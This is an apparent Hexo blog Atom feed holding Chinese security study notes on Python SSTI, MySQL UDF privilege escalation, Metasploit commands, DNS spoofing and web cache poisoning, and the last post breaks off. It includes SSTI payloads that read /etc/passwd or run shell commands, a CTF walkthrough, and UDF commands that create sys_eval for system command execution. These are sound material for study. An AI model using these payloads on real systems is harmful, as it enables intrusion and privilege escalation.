<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-07T05:08:09.522Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>img</title>
    <link href="http://yoursite.com/2020/07/07/img/"/>
    <id>http://yoursite.com/2020/07/07/img/</id>
    <published>2020-07-07T05:08:09.000Z</published>
    <updated>2020-07-07T05:08:09.522Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>测试</title>
    <link href="http://yoursite.com/2020/07/07/%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2020/07/07/%E6%B5%8B%E8%AF%95/</id>
    <published>2020-07-07T05:03:24.429Z</published>
    <updated>2020-07-07T05:09:49.034Z</updated>
    
    <content type="html"><![CDATA[<p>​                        “我们的孤独就像天空中漂浮的城市，仿佛是一个秘密，却无从述说。”</p><p>​                             <img src="/2020/07/07/%E6%B5%8B%E8%AF%95/C:%5CUsers%5CDELL%5Cblog%5Csource_posts%5Cimg%5C2.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​                        “我们的孤独就像天空中漂浮的城市，仿佛是一个秘密，却无从述说。”&lt;/p&gt;
&lt;p&gt;​                             &lt;img src=&quot;/2020/07/07/%E6%B5%8B%E8%AF%95/C
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python SSTI</title>
    <link href="http://yoursite.com/2020/06/29/python%20SSTI/"/>
    <id>http://yoursite.com/2020/06/29/python%20SSTI/</id>
    <published>2020-06-29T12:33:33.253Z</published>
    <updated>2020-06-29T11:22:35.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-SSTI注入"><a href="#python-SSTI注入" class="headerlink" title="python SSTI注入"></a>python SSTI注入</h1><h3 id="SSTI是什么"><a href="#SSTI是什么" class="headerlink" title="SSTI是什么"></a>SSTI是什么</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，也给出了一个注入的概念。<br>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。<br>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。<br>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。<br>现在网上提起的比较多的是Python的网站。</p><p>原文链接：<a href="https://blog.csdn.net/zz_Caleb/java/article/details/96480967" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/java/article/details/96480967</a></p><blockquote><p>python模块注入：</p><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><p><strong>测试方法：</strong></p><p>1、确定使用的引擎<br>2、查看引擎相关的文档，确定其安全机制以及自带的函数和变量<br>3、需找攻击面，尝试攻击</p><p><strong>测试用例</strong></p><pre><code>简单的数学表达式：{{ 7+7 }} =&gt; 14字符串表达式 ：{{ "ajin" }} =&gt; ajinRuby：&lt;%= 7 * 7 %&gt;&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;Java：${7*7}Twig：{{7*7}}Smarty：{php}echo `id`;{/php}AngularJS：$eval(&#39;1+1&#39;)Tornado：引用模块 {% import module %}=&gt; {% import os %}{{ os.popen("whoami").read() }}Flask/Jinja2：{{ config.items() }}{{''.__class__.__mro__[-1].__subclasses__()}}Django：{{ request }}{% debug %}{% load module %}{% include "x.html" %}{% extends "x.html" %}</code></pre><p><strong>目标</strong></p><p>创建对象<br>文件读写<br>远程文件包含<br>信息泄漏<br>提权</p><p><strong>相关属性</strong><br><code>__class__</code></p><pre><code>python中的新式类（即显示继承object对象的类）都有一个属性 ``__class__`` 用于获取当前实例对应的类，例如 ``&quot;&quot;.__class__`` 就可以获取到字符串实例对应的类``__mro__`` </code></pre><p>python中类对象的 <code>__mro__</code> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p><p><code>__globals__</code></p><pre><code>保存了函数所有的所有全局变量，在利用中，可以使用 ``__init__`` 获取对象的函数，并通过 ``__globals__`` 获取 ``file`` ``os`` 等模块以进行下一步的利用``__subclasses__()``</code></pre><p>python的新式类都保留了它所有的子类的引用，<strong>subclasses</strong>() 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p><p>因为python中的类都是继承object的，所以只要调用object类对象的 <strong>subclasses</strong>() 方法就可以获取想要的类的对象。</p><p><strong>常见Payload</strong></p><p>1、<code>().__class__.__bases__[0].__subclasses__()[40](r&#39;/etc/passwd&#39;).read()</code></p><p>2、`().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.func_globals.values()[13]<a href="'__import__(" os"">‘eval’</a>.popen(“ls /“).read()’ )</p></blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_37865996/java/article/details/102365374" target="_blank" rel="noopener">https://blog.csdn.net/qq_37865996/java/article/details/102365374</a></p><p><strong>例题：</strong></p><p>攻防世界shrine</p><p>此题涉及SSTI、Flask 框架、Bypass Sandbox</p><p>看这里：<a href="https://www.cnblogs.com/gzs-monkey/p/10727330.html" target="_blank" rel="noopener">https://www.cnblogs.com/gzs-monkey/p/10727330.html</a></p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()    //默认访问路径为‘/’，那么会将源代码读取出来，也就是默认页面所呈现的。@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))//访问‘/shrine/’路径下，传入一个值，返回的是上面的这一行，输入的值首先被传到了safe_jinja函数，然后由flask.render_template_string进行渲染if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>flask 在 /shrine/ 下的 SSTI，对 payload 进行了过滤，对小括号进行了替换，将 ( 和 ) 替换为空字符串，将 config 和 self 添加进了黑名单</p><p>payload：<code>/shrine/</code></p><p>参考博客：<a href="https://blog.csdn.net/mochu7777777/article/details/104868162" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104868162</a></p><p><a href="https://blog.csdn.net/qq_41429081/article/details/105487173?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/qq_41429081/article/details/105487173?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-SSTI注入&quot;&gt;&lt;a href=&quot;#python-SSTI注入&quot; class=&quot;headerlink&quot; title=&quot;python SSTI注入&quot;&gt;&lt;/a&gt;python SSTI注入&lt;/h1&gt;&lt;h3 id=&quot;SSTI是什么&quot;&gt;&lt;a href=&quot;#SS
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>mysql udf提权原理</title>
    <link href="http://yoursite.com/2020/06/29/mysql%20udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/29/mysql%20udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-29T11:31:33.869Z</published>
    <updated>2020-06-29T12:34:54.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql-udf提权原理"><a href="#mysql-udf提权原理" class="headerlink" title="mysql udf提权原理"></a>mysql udf提权原理</h1><p><strong>什么是udf？</strong></p><pre><code> udf = ‘user defined function‘，即‘用户自定义函数’。 是通过添加新函数，对MYSQL的功能进行扩充，性质就象使用本地MYSQL函数如abs()或concat()。 udf在mysql5.1以后的版本中，存在于‘mysql/lib/plugin’目录下，文件后缀为‘.dll’，常用c语言编写。</code></pre><p>原文链接：<a href="https://blog.csdn.net/Mikasa_/java/article/details/89878927" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/java/article/details/89878927</a></p><p><strong>UDF提权原理：</strong></p><p>利用root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，然后利用 system权限进行提权操作。（利用MYSQL的自定义函数功能，将MYSQL帐号转化为系统system权限）</p><p>使用udf分三步：</p><ol><li>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）</li><li>从udf文件中引入自定义函数(user defined function)</li><li>执行自定义函数</li></ol><p><strong>本地实验：</strong></p><p><code>C:\Users\DELL\AppData\Local\Programs\Python\Python38\sqlmap\extra\cloak&gt;python cloak.py -d -i C:\Users\DELL\AppData\Local\Programs\Python\Python38\sqlmap\data\udf\mysql\windows\32\lib_mysqludf_sys.dll_</code></p><p>得到一个类型为应用程序扩展的文件。</p><p>进入mysql命令行（<code>mysql -u root -p</code>）：</p><p>输入<code>select  @@plugin_dir;</code>   得到dll文件的储存位置</p><p>将解密得到的dll文件复制到刚刚得到的目录下。</p><p>创建命令执行函数：</p><pre><code>create function  sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;或create function  sys_exec returns string soname &#39;lib_mysqludf_sys.dll&#39;;</code></pre><p>创建完成后可以直接运用执行系统命令：</p><p>select sys_eval(‘regedit’);</p><p>会弹注册表。</p><p>原文链接：<a href="https://blog.csdn.net/Mikasa_/java/article/details/89878927" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/java/article/details/89878927</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;mysql-udf提权原理&quot;&gt;&lt;a href=&quot;#mysql-udf提权原理&quot; class=&quot;headerlink&quot; title=&quot;mysql udf提权原理&quot;&gt;&lt;/a&gt;mysql udf提权原理&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;什么是udf？&lt;/strong&gt;&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MSF工具</title>
    <link href="http://yoursite.com/2020/06/29/MSF%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2020/06/29/MSF%E5%B7%A5%E5%85%B7/</id>
    <published>2020-06-29T11:10:37.676Z</published>
    <updated>2020-06-29T11:10:41.061Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSF工具"><a href="#MSF工具" class="headerlink" title="MSF工具"></a>MSF工具</h1><p>msfconsole简称msf是一款常用的渗透测试工具，包含了常见的漏洞利用模块和生成各种木马。通过MSF工具可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。是信息收集、漏洞扫描、权限提升、内网渗透等集成的工具。</p><p>输入msfconsole 进入msfconsole框架</p><pre><code>基本命令msfconsole   #启动MSF console界面msfupdate    #msf版本更新help/?       #打印当下窗口的帮助文档help command/command --help #打印command命令的帮助文档connect      #可以看成是msfconsole界面下的nc工具edit         #编辑模块的ruby文件，与用vim编辑相同show         #查看命令，可以看当前环境下的exploits、auxiliary、payloads等模块,其中Rank表示不同模块的评级（成功率和使用难易程度的重要参考），             #最常使用的是`show options`命令，表示当前上下文环境中的选项内容,`show missing`可以查看当前有哪些必须的配置没有设置show advanced   #一些不常用的高级选项，不会在`show options`中显示search       #搜索关键词内容对应的模块，如搜索ms10_046漏洞模块：（注意搜索出的内容所在基本目录为`/usr/share/metasploit-framework/modules/`）,除此之外search还可以添加一些筛选条件，如name、path、type等info         #当前模块的基本信息use          #使用不同的模块文件set/unset    #设置变量/取消变量设置setg/unsetg  #设置全局变量/取消全局变量设置，只会设置当前msf运行环境中的变量，退出msf后设置就复位save         #将设置保存到/root/.msf4/config，msf启动时会读取该文件，这样重新启动msf后设置依然保留back         #从模块上下文退回到msfconsole初始目录run/exploit  #运行漏洞模块sessions     #可以看见当前已经建立的攻击连接，利用`sessions -i id`命令进入指定连接jobs         #查看后台运行的模块load/unload  #连接插件，如load openvas，然后会出现相应的openvas命令，使用时需要用openvas_connect连接外部扫描器loadpath     #调用自己编写的功能模块route        #向session指定路由resource     #调用rc文件的命令并执行，以方便直接取得session</code></pre><p>原文链接：<a href="https://blog.csdn.net/Captain_RB/java/article/details/103836565" target="_blank" rel="noopener">https://blog.csdn.net/Captain_RB/java/article/details/103836565</a></p><p>MSF渗透测试：<a href="https://www.freebuf.com/sectool/210292.html#" target="_blank" rel="noopener">https://www.freebuf.com/sectool/210292.html#</a></p><p>一些参数：<a href="https://blog.bbskali.cn/index.php/archives/1760/" target="_blank" rel="noopener">https://blog.bbskali.cn/index.php/archives/1760/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MSF工具&quot;&gt;&lt;a href=&quot;#MSF工具&quot; class=&quot;headerlink&quot; title=&quot;MSF工具&quot;&gt;&lt;/a&gt;MSF工具&lt;/h1&gt;&lt;p&gt;msfconsole简称msf是一款常用的渗透测试工具，包含了常见的漏洞利用模块和生成各种木马。通过MSF工具可以很
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>缓存欺骗原理</title>
    <link href="http://yoursite.com/2020/06/29/%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/29/%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-29T08:58:20.244Z</published>
    <updated>2020-06-29T10:12:02.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓存欺骗原理"><a href="#缓存欺骗原理" class="headerlink" title="缓存欺骗原理"></a>缓存欺骗原理</h1><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 </p><p>原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><p>具体实现原理：</p><p>　1、当一个DNS缓存服务器从用户处获得域名请求时，服务器会在缓存中寻找是否有这个地址。如果没有，它就会向上级DNS服务器发出请求。<br>　　2、在出现这种漏洞之前，攻击者很难攻击DNS服务器；他们必须通过发送伪造查询响应、获得正确的查询参数以进入缓存服务器，进而控制合法DNS服务器。这个过程通过持续不到一秒钟，因此此类非法攻击很难获得成功。<br>　　3、但是现在利用该漏洞，攻击者有了转变。这是攻击者对缓存服务器进行持续不断查询请求，服务器不予以回应。比如一个攻击者可能发出类似请求：1y2a3n4g.g.cn，而且他也直到缓存服务器中不可能有这个域名。这就会引起缓存服务器发出更多查询请求，并且会出现更多欺骗应答的机会。<br>　　4、当然，这并不是说攻击者拥有很多机会来猜测查询参数的正确值。事实上，是这种开放源DNS服务器漏洞的公布，会让它在10s内受到危险攻击。<br>　　5、要知道，即使1y2a3n4g.g.cn受到缓存DNS中毒攻击危害也不大，因为没有人会发送这样的域名请求，但是，攻击者可以通过欺骗应答给缓存服务器指向一个非法的服务器域名地址，该地址对应一般为攻击者所控制或者伪装成DNS服务器或者DNS代理。<br>　　6、由于攻击者现在可以控制DNS域名服务器，每个网址的查询请求都会被重定向到黑客所指定的服务器上。</p><p><strong>主要欺骗形式</strong></p><p>1．hosts文件篡改<br>Hosts文件是一个用于存储计算机网络中节点信息的文件，它可以将主机名映射到相应的IP地址，实现DNS的功能，它可以由计算机的用户进行控制。<br>Hosts文件的存储位置在不同的操作系统中并不相同，甚至不同Windows版本的位置也不大一样：<br>Windows NT/2000/XP/2003/Vista/win7：默认位置为%SystemRoot%\system32\drivers\etc\，但也可以改变。<br>有很多网站不经过用户同意就将各种各样的插件安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的域名映射到错误的IP或本地计算机的IP，这样就不能访问了。在WINDOWSX系统中，约定127.0.0.1为本地计算机的IP地址, 0.0.0.0是错误的IP地址。<br>如果，我们在Hosts中，写入以下内容：<br>127.0.0.1 # 要屏蔽的网站 A<br>0.0.0.0 # 要屏蔽的网站 B<br>这样，计算机解析域名 A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。</p><p>2．本机DNS劫持<br>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能反应或访问的是假网址。<br>相关内容<br>域名解析的基本原理就是把域名翻译成IP地址，以便计算机能够进一步通信，传递内容和网址等。<br>由于域名劫持往往只能在特定的被劫持的网络范围内进行，所以在此范围外的域名服务器(DNS)能够返回正常的IP地址，高级用户可以在网络设置把DNS指向这些正常的域名服务器以实现对网址的正常访问。所以域名劫持通常相伴的措施——封锁正常DNS的IP。<br>如果知道该域名的真实IP地址，则可以直接用此IP代替域名后进行访问。比如访问百度，你可以直接用百度IP(111.13.100.92)访问。<br>简单的说就是把你要去的地址拦截下来，给你一个错误的地址，或者告诉你你要去的地方去不了，人为的导致你无法到达目的地，一般用于对一些不良网站的封杀或是一些黑客行为。</p><blockquote><p>1&gt;.DNS欺骗<br>在DNS的缓存还没有过期之前,如果在DNS的缓存中已经存在的记录,一旦有客户查询,DNS服务器将会直接返回缓存中的记录.<br>下面我们来看一个例子:<br>一台运行着Linux的Internet主机,并且提供rlogin服务,它的IP地址为123.45.67.89,它使用的DNS服务器(即/etc/resolv.conf中指向的DNS服务器)的IP地址为98.76.54.32,某个客户端(IP地址为38.222.74.2)试图连接到unix主机的rlogin端口,假设unix主机的/etc/hosts.equiv文件中使用的是dns名称来允许目标主机的访问,那么unix主机会向IP为98.76.54.32的DNS服务器发出一个PTR记录的查询:<br>123.45.67.89 -&gt; 98.76.54.32 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: 2.74.222.38.in-addr.arpa PTR<br>IP为98.76.54.32的DNS服务器中没有这个反向查询域的信息,经过一番查询,这个DNS服务器找到38.222.74.2和38.222.74.10为74.222.38.in-addr.arpa.的权威DNS服务器,所以它会向38.222.74.2发出PTR查询:<br>98.76.54.32 -&gt; 38.222.74.2 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: 2.74.222.38.in-addr.arpa PTR<br>请注意,38.222.74.2是我们的客户端IP,也就是说这台机子是完全掌握在我们手中的.我们可以更改它的DNS记录,让它返回我们所需要的结果:<br>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 2 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: trusted.host.com A 38.222.74.2<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>当98.76.54.32的DNS服务器收到这个应答后,会把结果转发给123.45.67.98,就是那台有rlogin服务的unix主机(也是我们的目标 :) ),并且98.76.54.32这台DNS服务器会把这次的查询结果缓存起来.<br>这时unix主机就认为IP地址为38.222.74.2的主机名为trusted.host.com,然后unix主机查询本地的/etc/hosts.equiv文件,看这台主机是否被允许使用rlogin服务,很显然,我们的欺骗达到了.<br>在unix的环境中,有另外一种技术来防止这种欺骗的发生,就是查询PTR记录后,也查询PTR返回的主机名的A记录,然后比较两个IP地址是否相同:<br>123.45.67.89 -&gt; 98.76.54.32 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: trusted.host.com A<br>很不幸,在98.76.54.32的DNS服务器不会去查询这个记录,而会直接返回在查询2.74.222.38.in-addr.arpa时得到的并且存在缓存中的信息:<br>98.76.54.32 -&gt; 123.45.67.89 [Query]<br>NQY: 1 NAN: 1 NNS: 2 NAD: 2<br>QY: trusted.host.com A<br>AN: trusted.host.com A 38.222.74.2<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>那么unix主机就认为38.222.74.2就是真正的trusted.host.com了,我们的目的达到了!<br>这种IP欺骗的条件是:你必须有一台Internet上的授权的DNS服务器,并且你能控制这台服务器,至少要能修改这台服务器的DNS记录,我们的欺骗才能进行.<br>2&gt;.拒绝服务攻击 Denial of service<br>还是上面的例子,如果我们更改位于38.222.74.2的记录,然后对位于98.76.54.32的DNS服务器发出2.74.222.38.in-addr.arpa的查询,并使得查询结果如下:<br>因为74.222.38.in-addr.arpa完全由我们控制,所以我们能很方便的修改这些信息来实现我们的目的.<br>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 2 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: <a href="http://www.company.com" target="_blank" rel="noopener">www.company.com</a> A 0.0.0.1<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>这样一来,使用98.76.54.32这台DNS服务器的用户就不能访问<a href="http://www.company.com了,因为这个IP根本就不存在" target="_blank" rel="noopener">www.company.com了,因为这个IP根本就不存在</a>!</p><p>3&gt;.偷取服务 Theft of services<br>还是上面的例子,只是更改的查询结果如下:<br>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 3 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: <a href="http://www.company.com" target="_blank" rel="noopener">www.company.com</a> CNAME <a href="http://www.competitor.com" target="_blank" rel="noopener">www.competitor.com</a><br>AN: company.com MX 0 mail.competitor.com<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10<br>这样一来,一个本想访问<a href="http://www.competitor.com的用户会被带到另外一个地方,甚至是敌对的公司的主页" target="_blank" rel="noopener">http://www.competitor.com的用户会被带到另外一个地方,甚至是敌对的公司的主页</a>(想想把华为和北电联起来是什么样的感觉. :) ).并且发给company.com的邮件会被发送给mail.compertitor.com.(越来越觉得在网络上的日子不踏实! xxbin这样想).</p><p>4&gt;.限制<br>对这些攻击,也有一定的限制.<br>首先,攻击者不能替换缓存中已经存在的记录.比如说,如果在98.76.54.32这个DNS服务器上已经有一条<a href="http://www.company.com的CNAME记录,那么攻击者试图替换为www.competitor.com将不会成功.然而,一些记录可以累加,比如A记录,如果在DNS的缓存中已经存在一条www.company.com的A记录为1.2.3.4,而攻击者却欺骗DNS服务器说www.company.com的A记录为4.3.2.1,那么www.company.com将会有两个A记录,客户端查询时会随机返回其中一个" target="_blank" rel="noopener">www.company.com的CNAME记录,那么攻击者试图替换为www.competitor.com将不会成功.然而,一些记录可以累加,比如A记录,如果在DNS的缓存中已经存在一条www.company.com的A记录为1.2.3.4,而攻击者却欺骗DNS服务器说www.company.com的A记录为4.3.2.1,那么www.company.com将会有两个A记录,客户端查询时会随机返回其中一个</a>.(呵呵,这不是loading balance么?)<br>其次,DNS服务器有个缓存刷新时间问题,如果<a href="http://www.netbuddy.org的TTL为7200,那么DNS服务器仅仅会把www.netbuddy.org的信息缓存7200秒或者说两个小时.如果攻击者放入一条TLL为604800的A记录,那么这条记录将会在缓存中保存一周时间,过了默认的两天后,这个DNS服务器就会到处&quot;分发&quot;攻击者假造的记录" target="_blank" rel="noopener">www.netbuddy.org的TTL为7200,那么DNS服务器仅仅会把www.netbuddy.org的信息缓存7200秒或者说两个小时.如果攻击者放入一条TLL为604800的A记录,那么这条记录将会在缓存中保存一周时间,过了默认的两天后,这个DNS服务器就会到处&quot;分发&quot;攻击者假造的记录</a>.<br>下面是常用的几种可以累加和不能累加的记录:<br>A can add<br>NS can add<br>MX can add<br>PTR cannot add</p></blockquote><p>原文链接：<a href="https://www.cnblogs.com/blacksunny/p/6910530.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/6910530.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;缓存欺骗原理&quot;&gt;&lt;a href=&quot;#缓存欺骗原理&quot; class=&quot;headerlink&quot; title=&quot;缓存欺骗原理&quot;&gt;&lt;/a&gt;缓存欺骗原理&lt;/h1&gt;&lt;p&gt;定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 &lt;/p&gt;
&lt;p&gt;原理：如果可以冒充域名服务器，然
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>缓存投毒原理</title>
    <link href="http://yoursite.com/2020/06/26/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/06/26/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-26T12:20:46.448Z</published>
    <updated>2020-06-29T08:53:21.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓存投毒原理"><a href="#缓存投毒原理" class="headerlink" title="缓存投毒原理"></a>缓存投毒原理</h1><p><strong>缓存是什么？</strong></p><p>缓存（cache），原始意义是指访问速度比一般随机存取存储器（RAM）快的一种高速存储器，通常它不像系统主存那样使用DRAM技术，而使用昂贵但较快速的SRAM技术。缓存的设置是所有现代计算机系统发挥高性能的重要因素之一。</p><p>如果服务器必须分别对每个HTTP请求发送新的响应，则可能会使服务器过载，从而导致延迟问题和不良的用户体验，尤其是在繁忙时期。缓存主要是减少此类问题的一种方法。</p><p>缓存位于服务器和用户之间，通常在固定的时间内保存（缓存）对特定请求的响应。如果另一个用户在这段时间内发送了同样的请求，则缓存会直接提供响应的副本(缓存)给用户，而无需与服务器直接进行交互。通过减少服务器对重复请求进行处理的次数，来减轻服务器的负担。<br>如下图就是同时间的用户访问同一个内容时，获取资源的过程。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200427115852-68b8ac64-883b-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200427115852-68b8ac64-883b-1.png" alt="img"></a></p><p><strong>缓存投毒</strong>，通常也称为域名系统投毒，或DNS缓存投毒。</p><p>缓存投毒通常也称为域名系统投毒，或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上。</p><p>随着恶意软件传播的增多，缓存投毒的方法也层出不穷。典型的一种是发送标题吸引人的垃圾邮件并诱导你去打开（比如标题为“你的退税出现严重问题”）。点击邮件中的图片和广告条幅也会将用户指向被投毒的网站。一旦用户的电脑被恶意代码感染，他今后所有的URL请求都将被自动指向恶意IP地址-哪怕被指向的“受害”服务器已经在其网页上清除了恶意代码。对那些知名或被大众信任的网站来说，缓存投毒是个危险的隐形杀手，比如那些自动更新病毒库时所打开的网页。 </p><p>缓存投毒与另外一种打着管理员或技术支持的幌子通过email来轰炸邮箱的DNS布毒方式不同，缓存投毒是一种URL投毒，或称地址投毒。用户上网时，浏览器的地址栏中会追加一段ID以记录用户浏览过的网页。</p><p><strong>Web缓存投毒攻击产生的影响</strong></p><p>Web缓存投毒的影响在很大程度上取决于两个关键因素：</p><p>1、攻击者可以成功地成功缓存什么</p><p>由于投毒的缓存更多是一种分发手段，而不是独立的攻击，因此Web缓存投毒的影响与注入的payload的危害密不可分。与大多数攻击一样，Web缓存投毒也可以与其他攻击结合使用，以进一步扩大潜在影响。</p><p>2、受影响页面上的通信量</p><p>仅当缓存投毒时，投毒响应才会提供给访问受影响页面的用户。结果，根据页面是否受欢迎，影响可能从不存在到严重不等。例如，如果攻击者设法破坏了主要网站主页上缓存的响应，则该攻击可能会影响成千上万的用户，而无需攻击者进行任何后续交互。</p><p><strong>构造Web缓存投毒攻击的攻击步骤：</strong></p><p>1、识别和评估非关键输入<br>缓存投毒攻击依赖于对unkeyed的操作。在cache中进行判别是否由缓存进行响应时会忽略 unkeyed 